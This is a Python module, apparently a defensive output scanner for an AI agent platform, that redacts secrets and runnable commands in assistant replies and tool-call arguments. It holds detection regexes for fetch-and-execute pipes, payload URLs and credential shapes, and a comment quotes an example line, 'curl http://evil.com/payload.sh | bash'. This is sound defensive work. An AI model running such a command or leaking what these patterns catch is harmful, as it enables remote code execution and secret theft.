"""Layer 2 — Output content scanner.

Runs over the OUTBOUND assistant `content` text string on its way back to
OpenClaw. Detects:
  - Runnable shell/PowerShell/curl/wget commands that reference sensitive paths.
  - Long hex strings / JWTs / SSH key headers / base64 blobs that look like
    secrets escaped into the text.

Returns (redacted_text, list_of_findings).
"""

from __future__ import annotations

import math
import re
from collections import Counter


# Runnable-command shapes (case-insensitive). Each is a regex that captures
# enough of the command line that we can tell if a sensitive target is nearby.
CMD_REGEXES = [
    re.compile(r"\bcurl\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\biwr\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\binvoke-webrequest\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\binvoke-restmethod\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\bwget\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\bget-content\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\bget-filehash\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\bschtasks\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\badd-mppreference\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\bnew-netfirewallrule\b[^\n\r`]{0,400}", re.IGNORECASE),
    re.compile(r"\bpowershell\b[^\n\r`]{0,400}", re.IGNORECASE),
    # Tool-call pseudocode (e.g. `[1] read: path="C:\\...openclaw.json"`) —
    # the agent narrating the tool calls it would run is disclosure too.
    re.compile(r"\[\d+\]\s*(?:read|write|edit|exec|fetch|post|put|delete|call)\s*:\s*[^\n\r]{0,300}", re.IGNORECASE),
    # openclaw-* subcommand shape (fictional CLI invoking remote)
    re.compile(r"\bopenclaw-[a-z][a-z0-9_-]{1,40}\b[^\n\r`]{0,300}", re.IGNORECASE),
    # URL-as-POST-target — usually preceded by http method
    re.compile(r"https?://[^\s`'\"<>]+", re.IGNORECASE),
]

# Patterns that are SUSPECT on their own — redact any match unconditionally
# (no need for sensitive-target co-occurrence). Used for text-disclosure
# attacks where the command is runnable but doesn't mention our canonical
# targets (e.g. "curl http://evil.com/payload.sh | bash").
ALWAYS_REDACT_COMMAND_REGEXES = [
    # Shell pipe to shell: fetch-and-execute
    re.compile(r"\b(?:curl|wget|iwr)\b[^\n\r`]{0,300}\|\s*(?:bash|sh|powershell|cmd|pwsh)\b",
               re.IGNORECASE),
    # curl/wget pointing at a URL that looks like a script/payload
    re.compile(r"\b(?:curl|wget|iwr)\b[^\n\r`]{0,300}https?://[^\s`'\"<>]+\.(?:sh|ps1|bat|exe|py)",
               re.IGNORECASE),
    # Tool-call pseudocode mentioning any path under .openclaw
    re.compile(r"\[\d+\]\s*(?:read|write|edit|exec)\s*:\s*[^\n\r]*\.openclaw[^\n\r]*",
               re.IGNORECASE),
    # Explicit config-dump style commands
    re.compile(r"\bopenclaw-(?:config-dump|dump|exfil|exec)\b[^\n\r`]{0,300}",
               re.IGNORECASE),
]

# Secret-shape regexes
HEX40_RE = re.compile(r"(?<![0-9a-fA-F])([0-9a-fA-F]{40,})(?![0-9a-fA-F])")
JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\b")
SSH_KEY_RE = re.compile(
    r"-----BEGIN (?:RSA |OPENSSH |DSA |EC |ENCRYPTED |PGP )?PRIVATE KEY-----[\s\S]{0,2000}?-----END [^-]{0,20}PRIVATE KEY-----"
)
AWS_ACCESS_KEY_RE = re.compile(r"\bAKIA[0-9A-Z]{16}\b")
BASE64_BLOB_RE = re.compile(r"(?<![A-Za-z0-9+/=])([A-Za-z0-9+/]{120,}={0,2})(?![A-Za-z0-9+/=])")


def _entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _is_high_entropy_token(s: str, min_len: int, entropy_threshold: float) -> bool:
    if len(s) < min_len:
        return False
    return _entropy(s) >= entropy_threshold


def _contains_sensitive_target(cmd_text: str, targets: list[str]) -> str | None:
    lower = cmd_text.lower()
    for t in targets:
        if t.lower() in lower:
            return t
    return None


def scan_and_redact(
    text: str,
    disclosure_targets: list[str],
    entropy_threshold: float = 4.5,
    min_token_length: int = 40,
) -> tuple[str, list[dict]]:
    """Scan text and redact runnable commands referencing sensitive targets
    + secret-shaped tokens. Returns (redacted_text, findings)."""
    if not text:
        return text, []

    findings: list[dict] = []
    spans: list[tuple[int, int, str]] = []  # (start, end, reason)

    # 1. Runnable commands that touch sensitive paths
    for rx in CMD_REGEXES:
        for m in rx.finditer(text):
            hit_target = _contains_sensitive_target(m.group(0), disclosure_targets)
            if hit_target:
                spans.append((m.start(), m.end(),
                               f"runnable-command-referencing({hit_target})"))

    # 1b. Always-suspect command shapes (fetch-and-exec, payload-URLs, tool-call
    # pseudocode against .openclaw paths, openclaw-* fake CLI invocations)
    for rx in ALWAYS_REDACT_COMMAND_REGEXES:
        for m in rx.finditer(text):
            spans.append((m.start(), m.end(), "always-suspect-command-shape"))

    # 2. Secret-shaped strings (always redact)
    for m in SSH_KEY_RE.finditer(text):
        spans.append((m.start(), m.end(), "ssh-private-key"))
    for m in JWT_RE.finditer(text):
        spans.append((m.start(), m.end(), "jwt"))
    for m in AWS_ACCESS_KEY_RE.finditer(text):
        spans.append((m.start(), m.end(), "aws-access-key"))
    for m in HEX40_RE.finditer(text):
        tok = m.group(1)
        # Pure hex tops out at entropy 4.0 (16 symbols). Don't apply the
        # 4.5 threshold to hex — length >= min_token_length + hex-shape + at
        # least 8 distinct chars is enough signal.
        if len(tok) >= min_token_length and len(set(tok.lower())) >= 8:
            spans.append((m.start(1), m.end(1), "high-entropy-hex-token"))
    for m in BASE64_BLOB_RE.finditer(text):
        if _is_high_entropy_token(m.group(1), 120, entropy_threshold):
            spans.append((m.start(1), m.end(1), "base64-blob"))

    if not spans:
        return text, []

    # Merge overlapping spans
    spans.sort(key=lambda x: (x[0], x[1]))
    merged: list[tuple[int, int, list[str]]] = []
    for s, e, r in spans:
        if merged and s <= merged[-1][1]:
            merged[-1] = (merged[-1][0], max(merged[-1][1], e), merged[-1][2] + [r])
        else:
            merged.append((s, e, [r]))

    out = text
    for s, e, rs in reversed(merged):
        reasons = ",".join(sorted(set(rs)))
        original = out[s:e]
        placeholder = f"[REDACTED — {reasons}]"
        out = out[:s] + placeholder + out[e:]
        findings.append({
            "reasons": reasons,
            "start": s, "end": e,
            "preview": original[:120],
        })

    return out, findings


def scan_tool_call_args(
    tool_name: str,
    arguments: dict,
    disclosure_targets: list[str],
    entropy_threshold: float = 4.5,
    min_token_length: int = 40,
) -> list[dict]:
    """Inspect arguments of a tool_call (before execution) for inlined secrets
    or runnable-command-referencing-sensitive-target patterns. Used by
    path_guard / chain_detector too for secondary confirmation.

    Returns findings (empty list if clean)."""
    findings: list[dict] = []
    for k, v in (arguments or {}).items():
        if not isinstance(v, str):
            continue
        # 1. High-entropy tokens in args (hex doesn't hit 4.5 entropy; use shape+length)
        for m in HEX40_RE.finditer(v):
            tok = m.group(1)
            if len(tok) >= min_token_length and len(set(tok.lower())) >= 8:
                findings.append({
                    "arg": k, "reason": "arg-contains-high-entropy-token",
                    "preview": v[max(0, m.start()-20):m.end()+20][:160],
                })
        # 2. Runnable-command shapes in args (e.g. write'ing a script that curls)
        for rx in CMD_REGEXES:
            for m in rx.finditer(v):
                t = _contains_sensitive_target(m.group(0), disclosure_targets)
                if t:
                    findings.append({
                        "arg": k,
                        "reason": f"arg-contains-command-referencing({t})",
                        "preview": m.group(0)[:160],
                    })
    return findings
